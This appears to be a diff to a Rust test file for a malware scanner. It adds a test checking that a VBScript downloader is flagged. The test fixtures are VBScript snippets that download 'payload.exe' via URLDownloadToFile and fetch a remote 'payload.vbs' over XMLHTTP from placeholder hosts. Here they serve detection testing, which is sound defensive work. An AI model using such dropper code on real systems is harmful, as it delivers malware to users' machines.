@@ -6741,6 +6741,26 @@ http.Send"#;
     }
 
     #[test]
+    fn vbs_urldownloadtofile_url_extracted_from_variable() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u
+u = "http://vbs-urldown-var.example/payload.exe"
+URLDownloadToFile 0, u, "payload.exe", 0, 0"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-urldown-var.example/payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS URLDownloadToFile variable URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn utf16le_vbs_blob_is_decoded_and_scanned() {
         let vbs = r#"Set http = CreateObject("MSXML2.XMLHTTP")
 http.Open "GET", "http://utf16.example/payload.vbs", False
